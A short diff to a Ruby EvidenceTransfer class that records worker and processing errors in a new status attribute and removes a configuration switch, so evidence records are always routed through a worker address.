@@ -23,8 +23,11 @@ class EvidenceTransfer
   include Singleton
   include RCS::Tracer
 
+  attr_accessor :status
+
   def initialize
     @workers = {}
+    @status = nil
     @http = {}
     @threads = Hash.new
   end
@@ -85,9 +88,11 @@ class EvidenceTransfer
             end
 
           rescue PersistentHTTP::Error => e
-            trace :error, "Http error with worker: #{e.message}"
+            @status = "Cannot reach worker: #{e.message}"
+            trace :error, @status
           rescue Exception => e
-            trace :error, "Error processing evidences: #{e.class} #{e.message}"
+            @status = "Error processing evidences: #{e.class} #{e.message}"
+            trace :error, @status
           ensure
             trace :debug, "Job for #{instance} is over (#{@threads.keys.size}/#{Thread.list.count} working threads)"
 
@@ -121,13 +126,9 @@ class EvidenceTransfer
     evidence = EvidenceManager.instance.get_evidence(id, instance)
     raise "evidence to be transferred is nil" if evidence.nil?
 
-    if Config.instance.global['WORKER_BALANCING']
-      address = get_worker_address(instance)
-      raise "invalid worker address" unless address
-      ret, error, action = send_evidence(address, instance, evidence)
-    else
-      ret, error, action = DB.instance.send_evidence(instance, evidence)
-    end
+    address = get_worker_address(instance)
+    raise "invalid worker address" unless address
+    ret, error, action = send_evidence(address, instance, evidence)
 
     if ret
       trace :info, "Evidence sent to db [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"
